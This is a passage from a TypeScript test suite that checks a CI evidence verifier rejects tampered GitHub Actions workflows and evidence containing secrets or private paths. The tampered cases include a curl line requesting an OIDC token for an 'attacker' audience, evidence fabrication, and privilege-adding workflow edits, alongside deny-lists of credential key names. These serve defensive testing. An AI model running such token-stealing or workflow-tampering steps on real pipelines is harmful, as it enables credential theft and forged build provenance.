          '      - name: Attest replacement through the CLI',
          '        run: |-',
          `          gh attestation verify "${TEST_RECORD_PATH}"`,
          '          --repo OpenCoven/chat',
        ]),
      },
      {
        name: 'OIDC token request',
        workflow: beforeProtectedUpload(TEST_PRODUCER_WORKFLOW_TEXT, [
          '      - name: Request an OIDC token',
          '        run: curl --fail-with-body "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=attacker" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"',
        ]),
      },
      {
        name: 'alternate record generator',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          yamlLiteralRun(TEST_UNIX_PRODUCTION_COMMAND),
          () =>
            '        run: node scripts/fabricate-evidence.mjs --output ".artifacts/client-v1-conformance-${{ matrix.platform }}.json"',
        ),
      },
      {
        name: 'unreachable supervised Unix producer',
        workflow: replaceWorkflowRun(
          TEST_PRODUCER_WORKFLOW_TEXT,
          TEST_UNIX_PRODUCTION_COMMAND,
          `if false; then ${TEST_UNIX_PRODUCTION_COMMAND}; fi`,
        ),
        synchronizedScriptDigest: {
          field: 'unixProductionScriptSha256',
          step: 'Run supervised Unix production and handoff',
        },
        expectedError: /exact canonical Unix production source/u,
      },
      {
        name: 'disabled broker-owned Unix validation',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          `        run: ${yamlSingleQuoted(TEST_CANONICAL_VALIDATION_COMMAND)}`,
          '        run: true',
        ),
      },
      {
        name: 'failure-tolerant broker-owned Unix validation',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '      - name: Validate broker-owned Unix platform record',
            "        if: matrix.platform != 'win32-x64'",
            '        shell: bash',
          ].join('\n'),
          [
            '      - name: Validate broker-owned Unix platform record',
            "        if: matrix.platform != 'win32-x64'",
            '        shell: bash',
            '        continue-on-error: true',
          ].join('\n'),
        ),
      },
      {
        name: 'record mutation after canonical validation',
        workflow: beforeProtectedUpload(TEST_PRODUCER_WORKFLOW_TEXT, [
          '      - name: Rewrite validated evidence',
          `        run: node scripts/rewrite-evidence.mjs "${TEST_RECORD_PATH}"`,
        ]),
      },
      {
        name: 'aggregation record substitution',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '        run: echo "protected evidence matrix completed"',
          `        run: node scripts/fabricate-evidence.mjs --output "${TEST_RECORD_PATH}"`,
        ),
      },
      {
        name: 'duplicate artifact-name occurrence',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '    permissions:\n      attestations: write',
          [
            '    env:',
            `      SHADOW_ARTIFACT_NAME: ${TEST_ARTIFACT_NAME}`,
            '    permissions:',
            '      attestations: write',
          ].join('\n'),
        ),
      },
      {
        name: 'script artifact upload',
        workflow: beforeProtectedUpload(TEST_PRODUCER_WORKFLOW_TEXT, [
          '      - name: Upload replacement with a script',
          `        run: node scripts/upload-evidence.mjs "${TEST_RECORD_PATH}"`,
        ]),
      },
      {
        name: 'dynamic action reference',
        workflow: beforeProtectedUpload(TEST_PRODUCER_WORKFLOW_TEXT, [
          '      - uses: ${{ matrix.evidence-action }}',
        ]),
      },
      {
        name: 'dynamic artifact name',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          `          name: ${TEST_ARTIFACT_NAME}`,
          '          name: ${{ format(\'client-v1-conformance-{0}\', matrix.platform) }}',
        ),
      },
      {
        name: 'dynamic record path',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          `          path: ${TEST_RECORD_PATH}`,
          '          path: ${{ github.workspace }}/replacement.json',
        ),
      },
      {
        name: 'unreviewed official action pin',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          CHECKOUT_ACTION,
          'actions/checkout@4444444444444444444444444444444444444444',
        ),
      },
      {
        name: 'dynamic checkout ref',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '          ref: ${{ github.sha }}',
          '          ref: ${{ github.ref }}',
        ),
      },
      {
        name: 'shallow checkout missing the locked harness revision',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace('          fetch-depth: 0\n', ''),
      },
      {
        name: 'missing reviewed SDK candidate checkout',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            `      - uses: ${CHECKOUT_ACTION}`,
            "        if: matrix.platform != 'win32-x64'",
            '        with:',
            "          repository: ${{ steps['phase1-revisions'].outputs.sdk_repository }}",
            "          ref: ${{ steps['phase1-revisions'].outputs.sdk_revision }}",
            '          path: .phase1-counterparts/sdk',
            '          persist-credentials: false',
            '',
          ].join('\n'),
          '',
        ),
      },
      {
        name: 'disabled required setup step',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          `      - uses: ${SETUP_NODE_ACTION}\n        with:`,
          `      - uses: ${SETUP_NODE_ACTION}\n        if: false\n        with:`,
        ),
      },
      {
        name: 'unreviewed trigger',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '  workflow_dispatch:\n',
          '  workflow_dispatch:\n  pull_request_target:\n',
        ),
      },
      {
        name: 'extra writable permission',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '      id-token: write\n',
          '      id-token: write\n      packages: write\n',
        ),
      },
      {
        name: 'extra job output',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '    strategy:\n',
          [
            '    outputs:',
            '      record: ${{ steps.fabricate.outputs.record }}',
            '    strategy:',
            '',
          ].join('\n'),
        ),
      },
      {
        name: 'Unicode line separator',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          'permissions:\n',
          '# hidden\u2028permissions: write-all\npermissions:\n',
        ),
      },
    ];
    for (const variant of invalidWorkflowVariants) {
      let synchronizedScriptDigest = {};
      if ('synchronizedScriptDigest' in variant) {
        try {
          synchronizedScriptDigest = {
            [variant.synchronizedScriptDigest.field]: workflowScriptSha256(
              variant.workflow,
              'platform-conformance',
              variant.synchronizedScriptDigest.step,
            ),
          };
        } catch (error) {
          throw new Error(
            `${variant.name} did not produce a parseable synchronized workflow`,
            { cause: error },
          );
        }
      }
      const workflowProducer: Parameters<
        typeof verifyProtectedWorkflow
      >[1] = {
        ...producer,
        workflow: {
          ...producer.workflow,
          size: Buffer.byteLength(variant.workflow, 'utf8'),
          sha256: sha256(variant.workflow),
          aggregationRunnerLabels: [
            ...producer.workflow.aggregationRunnerLabels,
          ],
          runnerLabels: {
            'darwin-arm64': [
              ...producer.workflow.runnerLabels['darwin-arm64'],
            ],
            'linux-x64': [
              ...producer.workflow.runnerLabels['linux-x64'],
            ],
            'win32-x64': [
              ...producer.workflow.runnerLabels['win32-x64'],
            ],
          },
          ...synchronizedScriptDigest,
        },
      };
      const expectedError =
        'expectedError' in variant ? variant.expectedError : /workflow/u;
      expect.soft(
        () =>
          verifyProtectedWorkflow(
            variant.workflow,
            workflowProducer,
            toolchain,
          ),
        variant.name,
      ).toThrow(expectedError);
    }

    expect(() =>
      verifyGitHubConformanceEvidence({
        ...verificationInputForWorkflow(
          TEST_PRODUCER_WORKFLOW_TEXT.replace(
            '    environment: client-v1-conformance',
            '    environment: unprotected',
          ),
        ),
        execute: (
          command: string,
          arguments_: string[],
          options: { cwd?: string },
        ) => {
          if (
            arguments_[0] === 'api'
            && (arguments_.at(-1) ?? '').includes(
              '/contents/.github/workflows/',
            )
          ) {
            return TEST_PRODUCER_WORKFLOW_TEXT.replace(
              '    environment: client-v1-conformance',
              '    environment: unprotected',
            );
          }
          return execute(command, arguments_, options);
        },
      } as never),
    ).toThrow(/workflow/u);

    const siblingSubstituteWorkflow = createProducerWorkflow({
      siblingSubstitute: true,
    });
    expect(() =>
      verifyGitHubConformanceEvidence({
        ...verificationInputForWorkflow(siblingSubstituteWorkflow),
        execute: (
          command: string,
          arguments_: string[],
          options: { cwd?: string },
        ) => {
          if (
            arguments_[0] === 'api'
            && (arguments_.at(-1) ?? '').includes(
              '/contents/.github/workflows/',
            )
          ) {
            return siblingSubstituteWorkflow;
          }
          return execute(command, arguments_, options);
        },
      } as never),
    ).toThrow(/workflow/u);

    const artifactAggregationWorkflow =
      TEST_PRODUCER_WORKFLOW_TEXT.replace(
        '        run: echo "protected evidence matrix completed"',
        '      - run: gh attestation verify record.json',
      );
    expect(() =>
      verifyGitHubConformanceEvidence({
        ...verificationInputForWorkflow(artifactAggregationWorkflow),
        execute: (
          command: string,
          arguments_: string[],
          options: { cwd?: string },
        ) => {
          if (
            arguments_[0] === 'api'
            && (arguments_.at(-1) ?? '').includes(
              '/contents/.github/workflows/',
            )
          ) {
            return artifactAggregationWorkflow;
          }
          return execute(command, arguments_, options);
        },
      } as never),
    ).toThrow(/workflow/u);

    expect(() =>
      verifyGitHubConformanceEvidence({
        ...verificationInput,
        execute: (
          command: string,
          arguments_: string[],
          options: { cwd?: string },
        ) => {
          if (
            arguments_[0] === 'api'
            && (arguments_.at(-1) ?? '').includes(
              '/contents/.github/workflows/',
            )
          ) {
            return `${TEST_PRODUCER_WORKFLOW_TEXT}# drift\n`;
          }
          return execute(command, arguments_, options);
        },
      } as never),
    ).toThrow(/workflow bytes do not match/u);

    const verificationInputForEnvironment = (
      environment: Record<string, unknown>,
    ) => ({
      ...verificationInput,
      execute: (
        command: string,
        arguments_: string[],
        options: { cwd?: string },
      ) => {
        const endpoint = arguments_.at(-1) ?? '';
        if (
          arguments_[0] === 'api'
          && endpoint.endsWith('/environments/client-v1-conformance')
        ) {
          return JSON.stringify(environment);
        }
        return execute(command, arguments_, options);
      },
    });
    const environmentVariants = [
      {
        name: 'missing protection',
        value: {
          id: Number(producer.workflow.environmentId),
          name: producer.workflow.environment,
          can_admins_bypass: false,
          protection_rules: [],
          deployment_branch_policy: null,
        },
      },
      {
        name: 'administrator bypass',
        value: {
          ...structuredClone(protectedEnvironment),
          can_admins_bypass: true,
        },
      },
      {
        name: 'wrong reviewer',
        value: {
          ...structuredClone(protectedEnvironment),
          protection_rules: [
            {
              type: 'required_reviewers',
              prevent_self_review: false,
              reviewers: [
                {
                  type: 'User',
                  reviewer: { id: 1, type: 'User' },
                },
              ],
            },
            { type: 'branch_policy' },
          ],
        },
      },
      {
        name: 'self-review prevention',
        value: {
          ...structuredClone(protectedEnvironment),
          protection_rules: [
            {
              type: 'required_reviewers',
              prevent_self_review: true,
              reviewers: [
                {
                  type: 'User',
                  reviewer: { id: 68_980_965, type: 'User' },
                },
              ],
            },
            { type: 'branch_policy' },
          ],
        },
      },
      {
        name: 'wait timer',
        value: {
          ...structuredClone(protectedEnvironment),
          protection_rules: [
            ...structuredClone(protectedEnvironment.protection_rules),
            { type: 'wait_timer', wait_timer: 1 },
          ],
        },
      },
    ];
    for (const variant of environmentVariants) {
      expect(
        () =>
          verifyGitHubConformanceEvidence(
            verificationInputForEnvironment(variant.value) as never,
          ),
        variant.name,
      ).toThrow(/exact protected environment policy/u);
    }

    expect(() =>
      verifyGitHubConformanceEvidence({
        ...verificationInput,
        execute: (
          command: string,
          arguments_: string[],
          options: { cwd?: string },
        ) => {
          const endpoint = arguments_.at(-1) ?? '';
          if (
            arguments_[0] === 'api'
            && endpoint.endsWith('/deployments/40000/statuses?per_page=100')
          ) {
            return JSON.stringify([
              {
                state: 'success',
                environment: producer.workflow.environment,
                log_url:
                  'https://github.com/OpenCoven/chat/actions/runs/10000/job/29999',
                target_url:
                  'https://github.com/OpenCoven/chat/actions/runs/10000/job/29999',
              },
              {
                state: 'pending',
                environment: producer.workflow.environment,
                log_url:
                  'https://github.com/OpenCoven/chat/actions/runs/10000/job/29999',
                target_url:
                  'https://github.com/OpenCoven/chat/actions/runs/10000/job/29999',
              },
            ]);
          }
          return execute(command, arguments_, options);
        },
      } as never),
    ).toThrow(/deployment does not belong to the exact protected job/u);

    expect(() =>
      verifyGitHubConformanceEvidence({
        ...verificationInput,
        execute: (
          command: string,
          arguments_: string[],
          options: { cwd?: string },
        ) => {
          const endpoint = arguments_.at(-1) ?? '';
          if (
            arguments_[0] === 'api'
            && endpoint.includes('/attempts/1/jobs?per_page=100')
          ) {
            const response = JSON.parse(
              execute(command, arguments_, options),
            ) as {
              total_count: number;
              jobs: Array<Record<string, unknown>>;
            };
            response.jobs.push({
              id: 29_999,
              run_id: 10_000,
              run_attempt: 1,
              head_sha: producer.commit,
              html_url:
                'https://github.com/OpenCoven/chat/actions/runs/10000/job/29999',
              name: 'sibling-substitute',
              labels: ['ubuntu-24.04'],
              workflow_name: producer.workflow.name,
              status: 'completed',
              conclusion: 'success',
            });
            response.total_count = response.jobs.length;
            return JSON.stringify(response);
          }
          return execute(command, arguments_, options);
        },
      } as never),
    ).toThrow(/exact frozen workflow job graph/u);

    const fabricatedAggregate = structuredClone(aggregateRecord);
    fabricatedAggregate.platforms[0]!.timing = {
      startedAt: '2026-08-29T04:00:00.000Z',
      completedAt: '2026-08-29T04:00:02.000Z',
      durationMs: 2_000,
    };
    const fabricatedAggregateText =
      contract.serializeCanonicalJson(fabricatedAggregate);
    const fabricatedIndex = structuredClone(index);
    fabricatedIndex.aggregate.size =
      Buffer.byteLength(fabricatedAggregateText, 'utf8');
    fabricatedIndex.aggregate.sha256 = sha256(fabricatedAggregateText);
    const fabricatedRecordText = contract.serializeCanonicalJson(
      fabricatedAggregate.platforms[0],
    );
    fabricatedIndex.platforms[0]!.record = {
      size: Buffer.byteLength(fabricatedRecordText, 'utf8'),
      sha256: sha256(fabricatedRecordText),
    };
    fabricatedIndex.platforms[0]!.protectedJob.artifactSha256 =
      sha256(fabricatedRecordText);
    fabricatedIndex.platforms[0]!.protectedJob.attestationSubjectSha256 =
      sha256(fabricatedRecordText);

    expect(() =>
      verifyGitHubConformanceEvidence({
        ...verificationInput,
        aggregateText: fabricatedAggregateText,
        indexText: contract.serializeCanonicalJson(fabricatedIndex),
      } as never),
    ).toThrow(/downloaded artifact digest/u);

    const selfAssertedJob = structuredClone(index);
    selfAssertedJob.platforms[0]!.protectedJob.jobId = '29999';
    expect(() =>
      verifyGitHubConformanceEvidence({
        ...verificationInput,
        indexText: contract.serializeCanonicalJson(selfAssertedJob),
      } as never),
    ).toThrow(/GitHub job id/u);
  });

  test.each([
    'Pairing_Secrets',
    'pairing-secret',
    'BEARER_TOKENS',
    'api.credentials',
    'privateKey',
    'passwords',
    'prompt_messages',
    'attachmentContents',
    'command-output',
    'private_cause',
    'requestHeaders',
    'response_urls',
    'socket-handles',
    'pipeHandles',
    'raw-diagnostics',
  ])('rejects normalized dangerous key %s', (key) => {
    expect(() => contract.scanConformanceEvidence({ [key]: 'redacted' })).toThrow(
      /forbidden evidence field/u,
    );
  });

  test.each([
    '/operator/private.json',
    '//server/share/private.json',
    'file:/operator/private.json',
    'file:C:\\operator\\private.json',
    '@name',
    '\\\\server\\pipe\\opencoven-private',
    '\\\\?\\GLOBALROOT\\Device\\HarddiskVolume1\\private.json',
    '\\\\.\\PhysicalDrive0',
    '//./pipe/opencoven-private',
    '/Users/operator/private.json',
    '/home/operator/private.json',
    '/mnt/c/Users/operator/private.json',
    '/private/var/folders/secret',
    '/var/tmp/private.json',
    '~/private.json',
    'C:\\Users\\operator\\private.json',
    'D:/operator/private.json',
    '\\\\server\\share\\private.json',
    '\\\\?\\C:\\private.json',
    '\\\\.\\pipe\\opencoven-private',
    '\u0000opencoven-abstract-socket',
    '@opencoven-abstract-socket',
    'https://operator.example.invalid/private',
    'file:///Users/operator/private.json',
    'unix:///tmp/opencoven.sock',
    '/workspace/operator/private.json',
    '/builds/operator/private.json',
    'operator@example.invalid',
  ])('rejects portable private path, handle, URL, or operator id %s', (value) => {
    expect(() => contract.scanConformanceEvidence({ detail: value })).toThrow();
  });

  test.each([
    '/operator/private.json',
    '//server/share/private.json',
    'file:/operator/private.json',
    '@name',
    '\\\\server\\pipe\\opencoven-private',
    'path=/operator/private.json',
    'uri:file:/operator/private.json',
    'pipe=\\\\server\\pipe\\opencoven-private',
    'socket=@name',
    'device,\\\\.\\PhysicalDrive0',
    'home:[~/private.json]',
  ])('rejects private value %s inside Cave text fields', (value) => {
    expect(() =>
      contract.scanConformanceEvidence({
        caveRecord: {
          assertions: [{ detail: `observed ${value}` }],
          findings: [{ says: `measured ${value}` }],
        },
      }),
    ).toThrow();
  });

  test.runIf(process.env.OPENCOVEN_CAVE_AUTHORITY_ROOT !== undefined)(
    'accepts the exact frozen Cave renderConformanceRecord output',
    async () => {
      const lock = readLock() as {
        sources: {
          cave: {
            repository: string;
            commit: string;
            tree: string;
          };
        };
      };
      const registry = readRegistry() as {
        assertions: {
          cave: string[];
        };
      };
      const engineBytes = readFileSync(
        resolve(
          process.env.OPENCOVEN_CAVE_AUTHORITY_ROOT as string,
          'scripts/client-v1-conformance.mjs',
        ),
      );
      const engineDigest = sha256(engineBytes);
      expect(engineDigest).toBe(
        (
          readLock() as {
            sources: {
              cave: {
                files: Array<{ path: string; sha256: string }>;
              };
            };
          }
        ).sources.cave.files.find(
          ({ path }) => path === 'scripts/client-v1-conformance.mjs',
        )?.sha256,
      );
      const engine = await loadCommittedCaveAssertionEngine({
        sourceBytes: engineBytes,
        digest: engineDigest,
      });
      const evidence = createPlatformEvidence(
        'darwin-arm64',
        lock,
        registry,
      ) as {
        caveRecord: unknown;
      };
      const assertions = registry.assertions.cave.map((id) => ({
        id,
        result: 'pass' as const,
        detail: id === engine.COVERAGE_ASSERTION_ID ? 'complete' : '',
      }));
      evidence.caveRecord = engine.renderConformanceRecord(assertions, {
        ranAt: '2026-08-29T04:00:00.000Z',
        caveVersion: '0.3.11',
        commit: lock.sources.cave.commit,
        platform: 'darwin-arm64',
        includeTtl: true,
        authorityTakeover: {
          authorityMode: 'enforce',
          discoveryVersion: 2,
          mechanism: 'hpke-bound-v1',
        },
        notCovered: engine.NOT_COVERED,
        findings: engine.FINDINGS,
      });

      expect(() =>
        contract.parsePlatformEvidence(
          contract.serializeCanonicalJson(evidence),
          'exact frozen Cave record',
        ),
      ).not.toThrow();
    },
  );

  test('runs the exact frozen Cave engine regression in CI', () => {
    const workflow = readFileSync(
      resolve(workspaceRoot, '.github/workflows/ci.yml'),
      'utf8',
    );

    expect(workflow).toContain(
      'OPENCOVEN_CAVE_AUTHORITY_ROOT: ${{ github.workspace }}/.artifacts/cave-authority',
    );
    expect(workflow).toContain(
      'ref: 6325fc4c1154c7d7398074a9760a2e2dc323b424',
    );
    expect(workflow).toContain('path: .artifacts/cave-authority');
  });

  test('still rejects arbitrary absolute paths in Cave findings and exclusions', () => {
    expect(() =>
      contract.scanConformanceEvidence({
        caveRecord: {
          notCovered: ['Operator state came from /Users/operator/private.json'],
          findings: [
            {
              says: 'The fixture was loaded from /var/tmp/private.json',
            },
          ],
        },
      }),
    ).toThrow(/private path/u);
  });

  test('allows schema-approved opaque identifiers, digests, versions, and API routes', () => {
    expect(() =>
      contract.scanConformanceEvidence({
        invocationId: '123e4567-e89b-42d3-a456-426614174000',
        opaqueId: '0123456789abcdef0123456789abcdef',
        sha256: 'a'.repeat(64),
        nodeVersion: 'v24.18.1',
        caveRecord: {
          assertions: [{ detail: '/api/client/v1/health' }],
        },
        artifacts: {
          sdkPackages: [{ packageName: '@opencoven/sdk' }],
        },
        diagnosticId: 'phase1.assertion.passed',
      }),
    ).not.toThrow();
    expect(() =>
      contract.scanConformanceEvidence({
        detail: '/api/client/v1/health',
      }),
    ).toThrow();
  });
});
